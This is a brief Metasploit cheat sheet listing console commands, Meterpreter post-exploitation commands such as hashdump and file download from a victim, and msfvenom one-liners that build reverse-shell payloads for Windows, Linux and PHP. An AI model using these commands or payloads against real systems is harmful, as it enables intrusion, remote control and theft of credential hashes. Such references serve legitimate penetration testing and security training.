# Metasploit Cheatsheet

## Basic Commands
- `msfconsole`: Start the Metasploit Framework.
- `search [query]`: Search for an exploit or module.
- `use [module]`: Select a specific exploit, auxiliary, or payload module.
- `show options`: Display available parameter options for the selected module.
- `set [OPTION] [value]`: Set the value of an option (e.g., `set RHOSTS 192.168.1.5`).
- `run` or `exploit`: Execute the current module.
- `back`: Go back to the main console context.

## Meterpreter Basics
- `sysinfo`: Hardware and OS info of the victim.
- `getuid`: See the current user context.
- `shell`: Drop into a system shell.
- `hashdump`: Dump the SAM database hashes.
- `download [remote_path] [local_path]`: Download files from victim.
- `upload [local_path] [remote_path]`: Upload files to victim.

## Payload Generation (msfvenom)
- **Windows reverse shell:**
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe`
- **Linux reverse shell:**
  `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf`
- **PHP reverse shell:**
  `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php`
